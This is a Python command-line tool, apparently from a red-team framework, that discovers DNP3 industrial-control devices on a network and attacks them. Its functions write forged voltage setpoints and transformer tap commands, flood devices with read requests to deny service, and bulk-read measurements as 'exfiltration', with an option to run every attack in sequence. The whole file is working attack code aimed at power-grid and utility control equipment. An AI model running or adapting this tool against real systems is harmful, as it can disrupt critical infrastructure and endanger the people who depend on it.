#!/usr/bin/env python3
"""
Standalone DNP3 Attack Tool

A direct DNP3 attack wrapper that runs from a red team box on the same network
as the target, without requiring metasploit, SSH, or watering hole attack infrastructure.

This tool wraps the existing DNP3Attack class to run attacks directly using the
DNP3Client without the WateringHoleAttack dependencies.

Usage:
    python3 standalone_dnp3_attack.py --target <IP> --attack <attack_type>

Attack Types:
    - command_injection: Execute command injection attack sequence
    - dos: Execute denial of service attack
    - false_data: Execute false data injection attack
    - exfiltration: Execute information exfiltration attack
    - all: Execute all attack types sequentially
    - discover: Discover DNP3 devices on the network

Examples:
    python3 standalone_dnp3_attack.py --target 192.168.1.100 --attack command_injection
    python3 standalone_dnp3_attack.py --discover --attack dos  # Discover then attack first device
    python3 standalone_dnp3_attack.py --target 10.0.0.50 --attack all
    python3 standalone_dnp3_attack.py --discover-only  # Just discover devices
"""

# --- FORCE LOGGING SETUP AT TOP ---
import logging
import sys

print("StandaloneDNP3Attack: script started (print test)")
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(
    logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", "%Y-%m-%d %H:%M:%S")
)
if not root_logger.hasHandlers():
    root_logger.addHandler(handler)
else:
    # Remove all handlers and add ours
    for h in root_logger.handlers[:]:
        root_logger.removeHandler(h)
    root_logger.addHandler(handler)
# --- END LOGGING SETUP ---

import argparse
import random
import time
from typing import Optional, List, Dict, Any

from controller.dnp3.DNP3Attack import DNP3DataPoint, DNP3Constants
from controller.dnp3.dnp3_client import DNP3Client

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

# Duplicate imports removed above - keeping just one set


class StandaloneDNP3Attack:
    """
    Standalone DNP3 attack implementation that wraps the existing DNP3Attack
    functionality without requiring metasploit or watering hole infrastructure.
    """

    def __init__(
        self,
        target_host: Optional[str] = None,
        target_port: int = 20000,
        use_discovery: bool = False,
    ):
        """
        Initialize the standalone DNP3 attack.

        Args:
            target_host: Target DNP3 device IP address (optional if using discovery)
            target_port: Target DNP3 port (default 20000)
            use_discovery: Whether to use device discovery
        """
        self.target_host = target_host
        self.target_port = target_port
        self.use_discovery = use_discovery
        self.discovered_devices: List[Dict[str, Any]] = []

        if target_host:
            self.client = DNP3Client(host=target_host, port=target_port)
            logger.info(f"Initialized DNP3 attack against {target_host}:{target_port}")
        else:
            # Initialize client without target for discovery mode
            self.client = DNP3Client(port=target_port)
            logger.info("Initialized DNP3 attack in discovery mode")

    def discover_devices(
        self,
        timeout: float = 10.0,
        scan_network: bool = True,
        network_range: str = "192.168.1.0/24",
    ) -> List[Dict[str, Any]]:
        """
        Discover DNP3 devices on the network.

        Args:
            timeout: Discovery timeout in seconds

        Returns:
            List of discovered devices
        """
        logger.info("Starting comprehensive DNP3 device discovery...")
        devices = self.client.discover_devices(
            timeout=timeout, scan_network=scan_network, network_range=network_range
        )
        self.discovered_devices = devices

        if devices:
            logger.info(f"Discovered {len(devices)} DNP3 devices:")
            for i, device in enumerate(devices, 1):
                logger.info(
                    f"  {i}. {device['ip']} - Status: {device.get('status', 'Unknown')}"
                )
        else:
            logger.warning("No DNP3 devices discovered")

        return devices

    def auto_target_first_device(self) -> bool:
        """
        Automatically target the first discovered device.

        Returns:
            True if successfully targeted a device, False otherwise
        """
        if not self.discovered_devices:
            logger.error("No discovered devices available")
            return False

        device = self.discovered_devices[0]
        self.target_host = device["ip"]
        self.client.host = device["ip"]

        logger.info(f"Auto-targeting DNP3 device: {device['ip']}")
        return True

    def _execute_dnp3_command(
        self, action: str, address: int, number: int, data_points: Optional[str] = None
    ) -> Optional[str]:
        """
        Execute a DNP3 command using the client directly.

        Args:
            action: DNP3 action (READ_BINARY, READ_ANALOG, WRITE_BINARY, WRITE_ANALOG)
            address: Starting address
            number: Number of points
            data_points: Comma-separated data points for write operations

        Returns:
            Response string or None if failed
        """
        try:
            # Ensure we have a target
            if not self.target_host and self.use_discovery:
                if not self.discovered_devices:
                    self.discover_devices()
                if not self.auto_target_first_device():
                    return None

            response = self.client.send_command(action, address, number, data_points)

            logger.info(f"DNP3 command {action} response: {response}")
            return response
        except Exception as e:
            logger.error(f"DNP3 command {action} failed: {str(e)}")
            return None

    def _execute_dnp3_sequence(
        self,
        action: str,
        address: int,
        number: int,
        data_points: Optional[str] = None,
        sequence_name: str = "",
    ) -> Optional[str]:
        """Execute a DNP3 command sequence with logging."""
        logger.info(f"Executing {sequence_name}: {action} at address {address}")
        response = self._execute_dnp3_command(action, address, number, data_points)
        logger.info(f"{sequence_name} response: {response}")
        return response

    def command_injection_attack(self) -> None:
        """Execute command injection attack sequence."""
        logger.info("Starting command injection attack")
        try:
            # Initial control sequence
            self._execute_dnp3_sequence(
                action="WRITE_ANALOG",
                address=2000,
                number=3,
                data_points="1,1,0",
                sequence_name="Initial control",
            )

            # Retry sequence
            for i in range(DNP3Constants.MAX_RETRIES):
                self._execute_dnp3_sequence(
                    action="WRITE_ANALOG",
                    address=3000,
                    number=5,
                    data_points="1,0,1,0,1",
                    sequence_name=f"Retry sequence {i+1}",
                )
                time.sleep(DNP3Constants.RETRY_DELAY)

            # Verification sequence
            self._execute_dnp3_sequence(
                action="READ_ANALOG",
                address=2000,
                number=3,
                sequence_name="Status verification",
            )

            logger.info("Command injection attack completed successfully")

        except Exception as e:
            logger.error(f"Command injection attack failed: {str(e)}")
            raise

    def denial_of_service_attack(self) -> None:
        """Execute DoS attack sequence."""
        logger.info("Starting denial of service attack")
        try:
            # Analog flood
            logger.info("Starting analog input flood")
            for i in range(DNP3Constants.FLOOD_ITERATIONS):
                try:
                    self._execute_dnp3_command(
                        action="READ_ANALOG", address=0, number=DNP3Constants.MAX_POINTS
                    )
                    if i % 50 == 0:
                        logger.info(
                            f"Analog flood iteration {i+1}/{DNP3Constants.FLOOD_ITERATIONS}"
                        )
                except Exception as e:
                    logger.error(f"Analog flood error at {i+1}: {str(e)}")

            # Binary flood
            logger.info("Starting binary input flood")
            for i in range(DNP3Constants.FLOOD_ITERATIONS):
                try:
                    self._execute_dnp3_command(
                        action="READ_BINARY", address=0, number=DNP3Constants.MAX_POINTS
                    )
                    if i % 50 == 0:
                        logger.info(
                            f"Binary flood iteration {i+1}/{DNP3Constants.FLOOD_ITERATIONS}"
                        )
                except Exception as e:
                    logger.error(f"Binary flood error at {i+1}: {str(e)}")

            # Check target status
            self._execute_dnp3_sequence(
                action="READ_ANALOG",
                address=DNP3Constants.STATUS_ADDRESS,
                number=1,
                sequence_name="Status check",
            )

            logger.info("Denial of service attack completed")

        except Exception as e:
            logger.error(f"DoS attack failed: {str(e)}")
            raise

    def false_data_injection_attack(self) -> None:
        """Execute false data injection attack sequence."""
        logger.info("Starting false data injection attack")
        try:
            # Voltage control
            self._execute_dnp3_sequence(
                action="WRITE_ANALOG",
                address=DNP3Constants.VOLTAGE_ADDRESS,
                number=5,
                data_points="13000,12800,12500,12200,12000",
                sequence_name="Voltage control write",
            )

            # Direct operate
            self._execute_dnp3_sequence(
                action="WRITE_ANALOG",  # Using WRITE_ANALOG as DIRECT_OPERATE maps to it
                address=DNP3Constants.VOLTAGE_ADDRESS,
                number=5,
                data_points="13000,12800,12500,12200,12000",
                sequence_name="Voltage direct operate",
            )

            # Tap control
            self._execute_dnp3_sequence(
                action="WRITE_BINARY",
                address=DNP3Constants.TAP_ADDRESS,
                number=3,
                data_points="1,0,1",
                sequence_name="Tap control",
            )

            logger.info("False data injection attack completed successfully")

        except Exception as e:
            logger.error(f"False data injection attack failed: {str(e)}")
            raise

    def information_exfiltration_attack(self) -> None:
        """Execute information exfiltration attack sequence."""
        logger.info("Starting information exfiltration attack")
        try:
            data_points = [
                DNP3DataPoint(
                    group=DNP3Constants.ANALOG_INPUTS,
                    variation=1,
                    start=1000,
                    count=10,
                    description="Analog measurements",
                ),
                DNP3DataPoint(
                    group=DNP3Constants.BINARY_INPUTS,
                    variation=2,
                    start=2000,
                    count=16,
                    description="Binary status",
                ),
                DNP3DataPoint(
                    group=DNP3Constants.COUNTER_INPUTS,
                    variation=1,
                    start=3000,
                    count=8,
                    description="Counter values",
                ),
            ]

            exfiltrated_data = {}
            random.shuffle(data_points)

            for point in data_points:
                result = self._execute_dnp3_sequence(
                    action="READ_ANALOG",  # Using READ_ANALOG for all read operations
                    address=point.start,
                    number=point.count,
                    sequence_name=f"Exfiltrating {point.description}",
                )

                if result:
                    exfiltrated_data[point.description] = {
                        "group": point.group,
                        "variation": point.variation,
                        "start_address": point.start,
                        "values": result,
                    }

                time.sleep(
                    random.uniform(DNP3Constants.MIN_DELAY, DNP3Constants.MAX_DELAY)
                )

            logger.info("\n=== Exfiltrated Data Summary ===")
            for desc, data in exfiltrated_data.items():
                logger.info(f"\n{desc}:")
                logger.info(f"Group: {data['group']}")
                logger.info(f"Values: {data['values']}")

            logger.info("Information exfiltration attack completed successfully")

        except Exception as e:
            logger.error(f"Information exfiltration failed: {str(e)}")
            raise

    def run_all_attacks(self) -> None:
        """Execute all attack types sequentially."""
        logger.info("Starting all DNP3 attacks")

        attacks = [
            ("Command Injection", self.command_injection_attack),
            ("False Data Injection", self.false_data_injection_attack),
            ("Information Exfiltration", self.information_exfiltration_attack),
            (
                "Denial of Service",
                self.denial_of_service_attack,
            ),  # DoS last as it may disrupt
        ]

        for attack_name, attack_method in attacks:
            try:
                logger.info(f"\n{'='*50}")
                logger.info(f"Executing {attack_name} Attack")
                logger.info(f"{'='*50}")
                attack_method()
                logger.info(f"{attack_name} attack completed successfully")
                time.sleep(2)  # Brief pause between attacks
            except Exception as e:
                logger.error(f"{attack_name} attack failed: {str(e)}")
                continue

        logger.info("\nAll DNP3 attacks completed")


def main() -> None:
    """Main entry point for the standalone DNP3 attack tool."""
    parser = argparse.ArgumentParser(
        description="Standalone DNP3 Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target 192.168.1.100 --attack command_injection
  %(prog)s --target broadcast --attack dos --port 20000
  %(prog)s --target 10.0.0.50 --attack all
        """,
    )

    parser.add_argument(
        "--target",
        help="Target DNP3 device IP address (optional if using --discover)",
    )

    parser.add_argument(
        "--port", type=int, default=20000, help="Target DNP3 port (default: 20000)"
    )

    parser.add_argument(
        "--attack",
        choices=["command_injection", "dos", "false_data", "exfiltration", "all"],
        help="Type of attack to execute",
    )

    parser.add_argument(
        "--discover",
        action="store_true",
        help="Discover devices before attacking (uses first discovered device)",
    )

    parser.add_argument(
        "--discover-only",
        action="store_true",
        help="Only discover devices, don't execute attacks",
    )

    parser.add_argument(
        "--discovery-timeout",
        type=float,
        default=10.0,
        help="Discovery timeout in seconds (default: 10.0)",
    )

    parser.add_argument(
        "--no-scan",
        action="store_true",
        help="Disable TCP port scanning (UDP broadcast only)",
    )

    parser.add_argument(
        "--network-range",
        type=str,
        default="192.168.1.0/24",
        help="Network range to scan in CIDR notation (default: 192.168.1.0/24)",
    )

    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Enable verbose logging"
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Validate arguments
    if not args.discover_only and not args.attack:
        parser.error("--attack is required unless using --discover-only")

    if not args.target and not args.discover and not args.discover_only:
        parser.error("Either --target or --discover/--discover-only must be specified")

    try:
        # Initialize the attack
        use_discovery = args.discover or args.discover_only
        attack = StandaloneDNP3Attack(
            args.target, args.port, use_discovery=use_discovery
        )

        # Handle discovery-only mode
        if args.discover_only:
            devices = attack.discover_devices(
                timeout=args.discovery_timeout,
                scan_network=not args.no_scan,
                network_range=args.network_range,
            )
            if devices:
                logger.info(f"\n=== Discovered {len(devices)} DNP3 devices ===")
                for i, device in enumerate(devices, 1):
                    logger.info(f"{i}. {device['ip']}")
                    logger.info(f"   Protocol: {device.get('protocol', 'DNP3')}")
                    logger.info(f"   Status: {device.get('status', 'Unknown')}")
                    logger.info(
                        f"   Function Code: {device.get('function_code', 'N/A')}"
                    )
                    logger.info(f"   Raw Response: {device.get('raw_hex', 'N/A')}")
            sys.exit(0)

        # Handle discovery + attack mode
        if args.discover:
            devices = attack.discover_devices(
                timeout=args.discovery_timeout,
                scan_network=not args.no_scan,
                network_range=args.network_range,
            )
            if not devices:
                logger.error("No devices discovered, cannot proceed with attacks")
                sys.exit(1)
            attack.auto_target_first_device()

        # Execute the specified attack
        if args.attack == "command_injection":
            attack.command_injection_attack()
        elif args.attack == "dos":
            attack.denial_of_service_attack()
        elif args.attack == "false_data":
            attack.false_data_injection_attack()
        elif args.attack == "exfiltration":
            attack.information_exfiltration_attack()
        elif args.attack == "all":
            attack.run_all_attacks()

        logger.info("Attack execution completed successfully")

    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
